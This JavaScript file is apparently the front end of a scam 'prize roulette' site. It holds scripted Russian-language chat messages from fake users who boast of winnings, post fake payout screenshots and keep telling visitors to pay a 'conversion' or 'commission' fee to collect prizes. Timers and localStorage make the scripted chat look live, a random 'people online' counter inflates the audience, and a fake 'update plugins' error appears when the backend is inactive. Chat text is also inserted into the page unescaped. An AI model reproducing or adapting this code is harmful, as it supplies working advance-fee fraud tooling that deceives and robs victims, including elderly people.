var messages = Array([
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Тааак! сегодня я должна выиграть приз!))'],
    ['Олег', 'chat/img/ppl/m1.jpg', 'я тут первый раз, что делать?'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Олег, ничего) Крути рулетку и жди, может что нибудь выиграешь.'],
    ['USER 39431', 'undefined', 'у меня сегодня малина прямо'],
    ['Ирина Сергеевна', 'chat/img/ppl/w3.jpg', 'я сюда одна через инстаграм попала?'],
    ['USER05339', 'undefined', 'Не знаю, мне лично на почту приграшение пришло'],
    ['ДАМИР', 'undefined', 'КОГДА ЗАКОНЧИТЬСЯ!??'],
    ['Иван Григорьевич', 'chat/img/ppl/m2.jpg', 'Осталось совсем немного, я сам уже жду результатов.'],
    ['USER5854', 'undefined', 'У кого как? Я целый куш забрала)'],
    ['Иван Григорьевич', 'chat/img/ppl/m2.jpg', 'У меня не сладко, блендер выиграл...'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'ТВОЮ МАТЬ! ПОЧЕМУ Я НИЧЕГО НЕ ВЫИГРАЛА'],
    ['Олег', 'chat/img/ppl/m1.jpg', 'Наташа, зачем ругаться? Это везение!'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Да не везет мне, попа...'],
    ['USER9585', 'undefined', 'Отличнооо... У меня вышло 32 тысяч<img src="chat/img/sc_ytbh27.jpg" class="vbrimgmessage">'],
    ['Ирина Сергеевна', 'chat/img/ppl/w3.jpg', 'Поделишься?'],
    ['USER9585', 'undefined', 'Ирина, со мной ктобы поделился)'],
    ['Ирина Сергеевна', 'chat/img/ppl/w3.jpg', 'Эх...'],
    ['Олег', 'chat/img/ppl/m1.jpg', 'ну что за?'],
    ['Рената', 'chat/img/ppl/w4.jpg', 'Подарки, молодой человек.'],
    ['USER8595', 'undefined', 'Отлично я сюда попал)'],
    ['Макс', 'undefined', 'дада, сегодня много призов разыграют'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Да уже почти все разыграли)'],
    ['Валентина', 'chat/img/ppl/w5.jpg', 'помогите, скажите что делать'],
    ['Рената', 'chat/img/ppl/w4.jpg', 'Крутить рулетку и ждать'],
    ['Николай', 'chat/img/ppl/m3.jpg', 'Для новеньких говорю, просто крутите рулетку и ждите!'],
    ['Иван Григорьевич', 'chat/img/ppl/m2.jpg', 'Да да, надо просто ждать и надеяться на миллион)0'],
    ['Ольга Петровна', 'undefined', 'Всем здравствуйте. Я пенсионерка, скажите пожалуйста, это обман?'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Это случайные подарки, может повезет, а может нет...'],
    ['USER95958', 'undefined', 'Мне одному дали фен?'],
    ['Ольга Петровна', 'undefined', 'Нет, тут таких много.'],
    ['Рената', 'chat/img/ppl/w4.jpg', 'ну вот и все! закончилась)'],
    ['Дима', 'undefined', 'и в чем прикол? мне пишет что ничего не выиграл. зря время потратил'],
    ['Николай', 'chat/img/ppl/m3.jpg', 'ну тебе не повезло Дмиан))'],
    ['Диана', 'chat/img/ppl/w6.jpg', 'Кто каким способом деньги забирать будет?'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Лично я на карту, удобнее всего.'],
    ['USER5454', 'undefined', 'мне тоже на карту лучше'],
    ['Олег', 'chat/img/ppl/m1.jpg', 'Сейчас по почте можно только подарок получить, деньги на карту'],
    ['Людмила', 'chat/img/ppl/w7.jpg', 'Олег, мне кажется почтой надежнее, а то с карты своруют еще'],
    ['Кристина', 'undefined', 'да сейчас с карты не своруешь уже'],
    ['Ирина', 'chat/img/ppl/w8.jpg', 'Да лучше на карту, почтой ждать устанешь'],
    ['Рената', 'chat/img/ppl/w4.jpg', 'У КОГО КАКОЙ ПРИЗ? У МЕНЯ 1900 РУБЛЕЙ'],
    ['Олег', 'chat/img/ppl/m1.jpg', '57 000, забухаю хахахах<img src="chat/img/sc_xpkvtv.jpg" class="vbrimgmessage">'],
    ['Людмила', 'chat/img/ppl/w7.jpg', 'У меня пусто...'],
    ['Марина', 'undefined', 'Ничего страшного, повезет ещё, Людмила!'],
    ['Марина', 'undefined', 'У меня супер приз 76к, глазам не верю<img src="chat/img/sc_sgh9iq.jpg" class="vbrimgmessage">'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Ух, поздравляю! И сколько конвертация с этой суммы?'],
    ['Марина', 'undefined', 'Я оплатила 300, теперь жду деньги)'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Напишите когда придет)'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Когда новый розыгрыш подарков?'],
    ['Николай', 'chat/img/ppl/m3.jpg', 'ХЗ'],
    ['Марина', 'undefined', 'Екатерина, пришла) Красота когда на карте кругленькая сумма))'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'завтра за шубой?)'],
    ['Марина', 'undefined', 'Нет, я лучше отложу.'],
    ['USER8541', 'undefined', 'Что еще за конвертация!???'],
    ['USER8541', 'undefined', 'её оплачивать надо!? АУ'],
    ['Олеся', 'undefined', 'Да, надо оплатить, только тем кто деньги выиграл'],
    ['Николай', 'chat/img/ppl/m3.jpg', 'Красота, только что 50 тысяч пришло'],
    ['USER8541', 'undefined', 'НИКОЛАЙ а вы конвертацию платили????'],
    ['Николай', 'chat/img/ppl/m3.jpg', 'да, оплачивал'],
    ['Олеся', 'undefined', 'а как вы хотели?) без неё никак.'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Ага, это точно, законы есть законы'],
    ['USER8541', 'undefined', 'ладно, сейчас попробую оплатить'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Кто на что приз потратит?'],
    ['Юлия', 'undefined', 'Мечтала о шубе. Её и куплю!'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Шубу из норки???))'],
    ['Юлия', 'undefined', 'Да, именно ее))'],
    ['USER8553', 'undefined', 'Каким способом лучше выигрыш забрать?'],
    ['Юлия', 'undefined', 'Если деньги, точно на карту!!'],
    ['USER8553', 'undefined', 'Конвертацию оплачивали?',  'bussines'],
    ['Юлия', 'undefined', 'Да'],
    ['USER8541', 'undefined', 'Все ровно'],
    ['USER8541', 'undefined', 'Оплатил доставку, получил свой айфон'],
    ['USER8553', 'undefined', 'долго ждали?'],
    ['USER8541', 'undefined', '3 дня и у меня дома айфон)'],
    ['USER8553', 'undefined', 'быстро'],
    ['Рената', 'chat/img/ppl/w4.jpg', 'Да, подарки быстро доставляют'],
    ['ЛЕХА', 'chat/img/ppl/m4.jpg', 'Не могу оплатить конвертацию че делать'],
    ['Иринаа', 'undefined', 'Почему не можете?'],
    ['ЛЕХА', 'chat/img/ppl/m4.jpg', 'не получается'],
    ['USER8541', 'undefined', 'Попробуй другим способом'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Так..когда следующея?)'],
    ['Екатерина', 'chat/img/ppl/w1.jpg', 'Теперь не скоро, а то и так много призов раздали.'],
    ['Регина', 'undefined', 'АГААА'],
    ['USER95843', 'undefined', 'Только что получил на карту, пиздец как рад!'],
    ['Регина', 'undefined', 'Круто.. Поздравляю'],
    ['Наталья', 'chat/img/ppl/w2.jpg', 'Сейчас бы пол ляма)'],
    ['Петр', 'chat/img/ppl/m6.jpg', 'Мечтайте дальше)'],
    ['Валентина', 'chat/img/ppl/w5.jpg', 'Это просто праздник, сумму называть не буду, что бы не сглазить'],
    ['Александр', 'chat/img/ppl/m7.jpg', 'До свидания'],
    ['Елена Дмитриевна', 'undefined', 'пока Рената))'],
    ['Станислав', 'chat/img/ppl/m8.jpg', 'а я напьюся от счастья))'],
    ['Ксения', 'undefined', 'только не спейтесь'],
    ['Константин', 'chat/img/ppl/m5.jpg', 'ххахахха'],
    ['Надежда', 'undefined', 'Ждем следующий розыгрыш! Всем пока'],
    ['Дарья', 'chat/img/ppl/w10.jpg', 'После оплаты конвертации 10 минут перевод ждала, думала уже не придет)'],
    ['Ксения', 'undefined', 'у меня мин за 5 пришло'],
    ['Анастасия', 'undefined', 'Мне вообще сразу после оплаты пришли деньги'],
    ['Полина', 'undefined', 'Какая сумма была?.'],
    ['Анастасия', 'undefined', '95000'],
    ['Полина', 'undefined', 'Примите поздравления'],
    ['Анастасия', 'undefined', 'Спасибо)'],
    ['User85553', 'undefined', 'Всем добра!'],
    ['Кристинка', 'undefined', 'всем пока'],
    ['Константин', 'chat/img/ppl/m5.jpg', 'Пока'],
    ['Маргарита', 'undefined', 'До встречи))'],
    ['Ксения', 'undefined', 'пока'],
    ['Анастасия', 'undefined', 'все уходят?(('],
    ['Надежда', 'undefined', 'Ну да, надо идти выигрыши тратить'],
    ['Маргарита', 'undefined', 'это точно'],
    ['Анастасия', 'undefined', 'Пока'],
    ['ЛЕХА', 'chat/img/ppl/m4.jpg', '=)'],
], [
    ['Анастасия', 'undefined', 'кто нибудь комиссионый платеж оплачивал'],
    ['Диман', 'undefined', 'да, я оплатил'],
    ['Анастасия', 'undefined', 'и что? пришли деньги?'],
    ['Диман', 'undefined', 'Да, пришли'],
    ['Ирина', 'chat/img/ppl/w8.jpg', 'Ага, мне тоже пришлось оплачивать'],
    ['USER05339', 'undefined', 'ну комиссионый платеж только для тех, кто более 150000 тысяч выиграл'],
    ['ДАМИР', 'undefined', 'ДА, ПОЭТОМУ МОЖНО И ОПЛАТИТЬ)'],
    ['Анастасия', 'undefined', 'Сейчас попробую оплатить'],
    ['USER5854', 'undefined', 'Отличный розыгрыш)'],
    ['Иван', 'chat/img/ppl/m9.jpg', 'как дела господа?'],
    ['Анастасия', 'undefined', 'все отлично'],
    ['USER9593', 'undefined', 'все хорошо, у вас как?'],
    ['Иван', 'chat/img/ppl/m9.jpg', 'тоже хорошо'],
    ['USER9593', 'undefined', 'Получили выигрышь? '],
    ['Иван', 'chat/img/ppl/m9.jpg', 'Да, а вы'],
    ['USER9593', 'undefined', 'Тоже))'],
    ['Ира', 'undefined', 'большое спасибо розыгрышу) пришло на карту 55 800 рублей))'],
], [
    ['User8423', 'undefined', 'Супер) получила 88000'],
    ['Алина', 'chat/img/ppl/w9.jpg', 'да, розыгрыш просто ШИК!'],
    ['Илья', 'undefined', 'всем привет)'],
    ['Орлов', 'chat/img/ppl/m10.jpg', 'Просит оплатит, че за фигня'],
    ['Илья', 'undefined', 'Орлов, у меня лично после конвертации деньги пришли'],
    ['Орлов', 'chat/img/ppl/m10.jpg', 'Илья, а  у вас какой выигрыш был?'],
    ['USER85934', 'undefined', 'СУПЕР-ПУПЕР))) пришло 9 тысяч'],
    ['Илья', 'undefined', 'Орлов, 157200 рублей'],
    ['USER5854', 'undefined', 'не плохо так)'],
    ['Орлов', 'chat/img/ppl/m10.jpg', 'ааа, у меня просто 225 000 рублей, поэтому и просит'],
    ['User8423', 'undefined', 'ну и чего ждешь?)'],
    ['Илья', 'undefined', 'Ага) ради 225 тысяч нежалко'],
    ['Иван', 'chat/img/ppl/m9.jpg', 'Это точно)'],
    ['USER7577', 'undefined', 'Я тоже оплачивал '],
    ['Иван', 'chat/img/ppl/m9.jpg', 'И что?'],
    ['USER7577', 'undefined', 'Иван, после оплаты деньги пришли'],
    ['Иван', 'chat/img/ppl/m9.jpg', 'Много?)'],
    ['Дарья', 'chat/img/ppl/w10.jpg', 'всем привет))'],
    ['USER55537', 'undefined', 'Приветики'],
    ['Иван', 'chat/img/ppl/m9.jpg', 'привет Дарья)'],
]);

function getMessageArrayID(page_id) {
    if (page_id < 4) {
        return 0;
    }
    else if (page_id < 6) {
        return 1;
    }
    else if (page_id < 7) {
        return 2;
    }
    else {
        return 0;
    }
}






function updateScriptMessages() {
    var ctime       = Date.now();
    var arrayid     = getMessageArrayID(page_id);
    var time        = localStorage['chatmsgSCTIMELM'] == undefined ? ctime : parseInt(localStorage['chatmsgSCTIMELM']);
    if (time <= ctime) {
        var last = localStorage['chatmsgSCLAST' + arrayid] == undefined ? 0 : parseInt(localStorage['chatmsgSCLAST' + arrayid]);
        if (last < messages[arrayid].length) {
            localStorage['chatmsgSCTIMELM'] = Math.round(ctime + 4000 + Math.random() * 14000);
            if (last < 1 && arrayid == 0) {
                for (last = 0 ; last < 15 ; last++) {
                    addChatMessage(messages[arrayid][last][2], messages[arrayid][last][0], messages[arrayid][last][1], false);
                }
                localStorage['chatmsgSCLAST' + arrayid] = last;
            }
            else {
                addChatMessage(messages[arrayid][last][2], messages[arrayid][last][0], messages[arrayid][last][1], false);
                localStorage['chatmsgSCLAST' + arrayid] = last + 1;
            }
        }
    }
}
var lastscroll = 0;
var toscroll = 0;
var divscroll  = $(".messages");
var divscrollbutton = $('.buttonscrollend');
var isuserscrolltop = false;
function smarlScroll() {
    var currentScroll   = divscroll.scrollTop();
    var toScroll        = divscroll.prop('scrollHeight') - divscroll.outerHeight();

    if (!isuserscrolltop && currentScroll < toScroll) {
        if (toScroll - currentScroll > 500) {
            divscroll.scrollTop(toScroll - 100);
            lastscroll = toScroll - 100;
        }
        else {
            divscroll.scrollTop(currentScroll + 10);
            lastscroll = currentScroll + 10;
        }
    }
    if (lastscroll > toScroll) {
        lastscroll = toScroll;
    }
    if (isuserscrolltop && currentScroll >= toScroll) {
        isuserscrolltop = false;
    }
    if (isuserscrolltop && !divscrollbutton.hasClass('show')) {
        divscrollbutton.addClass('show');
    }
    else if (!isuserscrolltop && divscrollbutton.hasClass('show')) {
        divscrollbutton.removeClass('show');
    }
}
setInterval(smarlScroll, 20);
$('.messages').scroll(function() {
    var currentScroll = divscroll.scrollTop();
    if (currentScroll < lastscroll) {
        isuserscrolltop = true;
    }
});
divscrollbutton.on('click', function() {
    isuserscrolltop = false;
});



$('<div id="overlay" onclick="noplgerr_hide()"></div><div id="addcommentswndwn" class="modal-box"><span class="modal-close" title="Закрыть" onclick="noplgerr_hide()"></span><div style="width:100%; padding:40px" class="hejbrfhgrve"><p><center><b>Ошибка</b>. Обновите плагины или повторите попытку позже</center><br><center><img src="chat/img/flash.png" onclick="noplgerr_hide()"></center></p></div></div>').appendTo('body');
function noplgerr_hide() {
    $("#overlay").removeClass("active");
    $(".modal-box").removeClass("active");
    $(".fdgdfgd").removeClass("active");
    setTimeout(function() {
        $("#overlay").css("display", "none");
        $(".modal-box").css("display", "none");
        $(".fdgdfgd").css("display", "none")
    }, 350)
}

function noplgerr() {
    $("#overlay").css("display", "block");
    $("#addcommentswndwn").css("display", "block");
    setTimeout(function() {
        $("#overlay").addClass("active");
        $("#addcommentswndwn").addClass("active")
    }, 200)
}









var API_URL = 'chat/api/messages.php?t=chat&m=';
function htmlAddChatMessage(name, text, img, time, rep) {
    var rephtml = (rep == true || rep == 'true') ? '<div class="replmgs">Ответил(а) Вам:</div>' : '';


    if (name == undefined || name == 'undefined') {
        return $('.messages').append('<div class="onemessagevbr sender"><div class="messagetxt"><div class="chatvbrname">Вы</div><div class="jegkergd"><span class="djhg">' + text + '</span><div class="timechatvbr">' + time + '</div></div></div></div>');
    }
    if (img == undefined || img == 'undefined') {
        return $('.messages').append(rephtml + '<div class="onemessagevbr"><img src="chat/img/ppl/empty.jpg" class="avavbr"><div class="messagetxt"><div class="chatvbrname">' + name + '</div><div class="jegkergd"><span class="djhg">' + text + '</span><div class="timechatvbr">' + time + '</div></div></div></div>');
    }
    else {
        return $('.messages').append(rephtml + '<div class="onemessagevbr"><img src="' + img + '" class="avavbr"><div class="messagetxt"><div class="chatvbrname">' + name + '</div><div class="jegkergd"><span class="djhg">' + text + '</span><div class="timechatvbr">' + time + '</div></div></div></div>');
    }
}

function loadingChatMessage() {
    var last = localStorage['lastChatMSG'] == undefined ? 0 : parseInt(localStorage['lastChatMSG']);
    for (var i = 0 ; i < last ; i++) {
        htmlAddChatMessage(localStorage['chatmsgtmNAME' + i], localStorage['chatmsgtmTEXT' + i], localStorage['chatmsgtmIMG' + i], localStorage['chatmsgtmTIME' + i], localStorage['chatmsgtmREP' + i]);
    }
    if (last > 0) {
    }
}

loadingChatMessage();

function addChatMessage(text, name, img, rep) {
    var last = localStorage['lastChatMSG'] == undefined ? 0 : parseInt(localStorage['lastChatMSG']);
    localStorage['lastChatMSG'] = last + 1;

    var timeInMs = new Date();
    var time = (timeInMs.getHours() > 9 ? timeInMs.getHours() : ('0' + timeInMs.getHours())) + ':' + (timeInMs.getMinutes() > 9 ? timeInMs.getMinutes() : ('0' + timeInMs.getMinutes()));
    localStorage['chatmsgtmNAME' + last] = name;
    localStorage['chatmsgtmTEXT' + last] = text;
    localStorage['chatmsgtmIMG'  + last] = img;
    localStorage['chatmsgtmTIME' + last] = time;
    localStorage['chatmsgtmREP' + last]  = (rep == true)  ? 'true' : 'false';

    htmlAddChatMessage(name, text, img, time, rep);
}



function updateMessage() {
    $.get(API_URL + 'get', function(data) {
        var obj = JSON.parse(data);
        isactive = obj.isactive;

        if (obj.new.length > 0) {
            for (var i = 0 ; i < obj.new.length ; i++) {
                addChatMessage(obj.new[i].msg, obj.new[i].name, obj.new[i].img, true);
            }
            audioNM.play();
            isuserscrolltop = false;
            localStorage['chatmsgSCTIMELM'] = Math.round(Date.now() + 15000 + Math.random() * 10000);
        }
    });
    var tmUpdate = localStorage['sendMSGCHAT'] != undefined ? 10000 : 15000;
    setTimeout(updateMessage, tmUpdate);
}
function sendMessage(text) {
    $.get(API_URL + 'send&msg=' + text, function(data) {
        // OK
    });
}







function sendchatmsg() {
    if ($('.inputVBRSC').val().length > 0) {
        isuserscrolltop = false;
        if (isactive) {
            sendMessage($('.inputVBRSC').val());
            addChatMessage($('.inputVBRSC').val());
            $('.inputVBRSC').val('');

            localStorage['chatmsgSCTIMELM'] = Math.round(Date.now() + 40000 + Math.random() * 20000);
            localStorage['sendMSGCHAT'] = true;
        }
        else {
            noplgerr();
        }
    }
}

function updateonline() {
    var vals = ['62 человека', '61 человек', '62 человека', '63 человека', '60 человек', '64 человека', '62 человека', '65 человек', '61 человек', '63 человека'];
    var id = Math.round(Math.random() * vals.length);
    $('.vbronline').html(vals[id]);
}


$(document).on('click','.vbrimgmessage',function() {
    var url = $(this).attr('src');
    var html = '<div class="fullvbrimg"><img src="' + url + '"></div>';
    $('body').append(html);
});
$(document).on('click','.fullvbrimg',function(){
    $(this).remove();
});

updateScriptMessages();
setTimeout(updateMessage, 10000);
setInterval(updateonline, 5000);
setInterval(updateScriptMessages, 500);


var audioNM         = new Audio("audio1.mp3");
audioNM.loop        = false;
audioNM.autoplay    = false;
